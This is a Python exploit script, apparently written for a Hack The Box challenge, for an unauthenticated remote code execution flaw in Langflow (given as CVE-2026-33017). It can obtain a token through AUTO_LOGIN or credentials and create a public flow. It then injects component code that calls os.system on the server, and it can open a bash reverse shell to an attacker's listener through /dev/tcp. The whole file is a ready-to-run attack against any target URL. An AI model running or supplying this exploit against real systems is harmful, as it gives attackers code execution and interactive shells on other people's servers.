#!/usr/bin/env python3
"""
Langflow CVE-2026-33017 - Unauthenticated RCE
HTB Challenge: FireFlow

The exploit endpoint requires NO auth — just a valid public flow UUID.
The box has a pre-existing public flow, so no login needed at all.

Usage:
  python3 exploit.py <url> --flow-id <uuid> --revshell <lhost> <lport>
  python3 exploit.py <url> --flow-id <uuid> --cmd "id"

  # If AUTO_LOGIN is enabled (some instances), skip --flow-id:
  python3 exploit.py <url> --revshell <lhost> <lport>
  python3 exploit.py <url> --user admin --pass admin --revshell <lhost> <lport>
"""

import argparse
import sys
import time
import requests

requests.packages.urllib3.disable_warnings()

BANNER = r"""
 CVE-2026-33017 | Langflow <= 1.8.2 | Unauth RCE
"""

# ── helpers ───────────────────────────────────────────────────────────────────

def req(session, method, url, **kwargs):
    try:
        return session.request(method, url, verify=False, timeout=15, **kwargs)
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection failed: {url}")
        sys.exit(1)

def step(msg):  print(f"\n[*] {msg}")
def ok(msg):    print(f"[+] {msg}")
def fail(msg):  print(f"[-] {msg}"); sys.exit(1)

# ── auth (only needed if no --flow-id provided) ───────────────────────────────

def get_token(session, base, username=None, password=None):
    step("Getting auth token ...")
    r = req(session, "GET", f"{base}/api/v1/auto_login")
    if r.status_code == 200:
        token = r.json().get("access_token")
        if token:
            ok(f"AUTO_LOGIN succeeded → {token[:40]}...")
            return token

    print("[-] AUTO_LOGIN disabled. Trying credentials ...")
    if not username or not password:
        fail("Provide creds with --user and --pass (or use --flow-id to skip auth entirely)")

    r = req(session, "POST", f"{base}/api/v1/login",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"username": username, "password": password})
    if r.status_code != 200:
        fail(f"Login failed ({r.status_code}): {r.text[:200]}")

    token = r.json().get("access_token")
    if not token:
        fail("No access_token in response.")
    ok(f"Login OK → {token[:40]}...")
    return token


def create_public_flow(session, base, token):
    step("Creating public flow ...")
    r = req(session, "POST", f"{base}/api/v1/flows/",
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            json={"name": "pwn", "data": {"nodes": [], "edges": []}, "access_type": "PUBLIC"})
    if r.status_code not in (200, 201):
        fail(f"Flow creation failed ({r.status_code}): {r.text[:200]}")
    flow_id = r.json().get("id")
    if not flow_id:
        fail("No flow id in response.")
    ok(f"Flow ID: {flow_id}")
    return flow_id

# ── payload ───────────────────────────────────────────────────────────────────

def build_payload(command: str) -> dict:
    """
    Matches the working PoC exactly:
    - _x = os.system(cmd)  →  ast.Assign node, executed at graph-build time
    - No 'inputs' key
    - lfx.* imports
    """
    evil_code = (
        "import os\n\n"
        f"_x = os.system({command!r})\n\n"
        "from lfx.custom.custom_component.component import Component\n"
        "from lfx.io import Output\n"
        "from lfx.schema.data import Data\n\n"
        "class ExploitComp(Component):\n"
        "    display_name=\"X\"\n"
        "    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n"
        "    def r(self)->Data:\n"
        "        return Data(data={})\n"
    )

    return {
        "data": {
            "nodes": [{
                "id": "Exploit-001",
                "type": "genericNode",
                "position": {"x": 0, "y": 0},
                "data": {
                    "id": "Exploit-001",
                    "type": "ExploitComp",
                    "node": {
                        "template": {
                            "code": {
                                "type": "code",
                                "required": True,
                                "show": True,
                                "multiline": True,
                                "value": evil_code,
                                "name": "code",
                                "password": False,
                                "advanced": False,
                                "dynamic": False
                            },
                            "_type": "Component"
                        },
                        "description": "X",
                        "base_classes": ["Data"],
                        "display_name": "ExploitComp",
                        "name": "ExploitComp",
                        "frozen": False,
                        "outputs": [{
                            "types": ["Data"], "selected": "Data",
                            "name": "o", "display_name": "O",
                            "method": "r", "value": "__UNDEFINED__",
                            "cache": True, "allows_loop": False,
                            "tool_mode": False, "hidden": None,
                            "required_inputs": None, "group_outputs": False
                        }],
                        "field_order": ["code"],
                        "beta": False,
                        "edited": False
                    }
                }
            }],
            "edges": []
        }
        # intentionally no 'inputs' key — matches working PoC
    }

# ── exploit ───────────────────────────────────────────────────────────────────

def fire(session, base, flow_id, command):
    step(f"Firing unauthenticated RCE → {flow_id}")
    print(f"    cmd: {command!r}")
    r = req(session, "POST",
            f"{base}/api/v1/build_public_tmp/{flow_id}/flow",
            headers={"Content-Type": "application/json"},
            cookies={"client_id": "attacker"},
            json=build_payload(command))

    if r.status_code == 200:
        job_id = r.json().get("id", "?")
        ok(f"HTTP 200 ✓  Job ID: {job_id}")
    else:
        fail(f"Exploit failed ({r.status_code}): {r.text[:300]}")

# ── main ──────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(description="Langflow CVE-2026-33017 exploit")
    p.add_argument("target", help="Target URL e.g. https://flow.fireflow.htb")
    p.add_argument("--cmd", default="id", help="Command to run (default: id)")
    p.add_argument("--flow-id", help="Existing public flow UUID (no auth needed)")
    p.add_argument("--user", help="Username if AUTO_LOGIN disabled")
    p.add_argument("--pass", dest="password", help="Password")
    p.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"),
                   help="Reverse shell to LHOST:LPORT")
    return p.parse_args()


def main():
    print(BANNER)
    args = parse_args()
    base = args.target.rstrip("/")
    session = requests.Session()

    # Build command string
    if args.revshell:
        lhost, lport = args.revshell
        command = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        print(f"[*] Reverse shell mode → {lhost}:{lport}")
        print(f"[*] Start listener:  nc -lvnp {lport}")
        input("[*] Press Enter when listener is ready ...")
    else:
        command = args.cmd

    # Get flow_id — from arg (no auth), or create one (needs auth)
    if args.flow_id:
        flow_id = args.flow_id
        ok(f"Using provided flow ID: {flow_id}")
    else:
        token = get_token(session, base, args.user, args.password)
        flow_id = create_public_flow(session, base, token)

    # Fire — no auth required for this step regardless
    fire(session, base, flow_id, command)

    if args.revshell:
        print("\n[*] Payload sent — check your listener.")
    else:
        print(f"\n[*] Done. Output is server-side only.")
        print(f"    Use --revshell to get an interactive shell.")


if __name__ == "__main__":
    main()
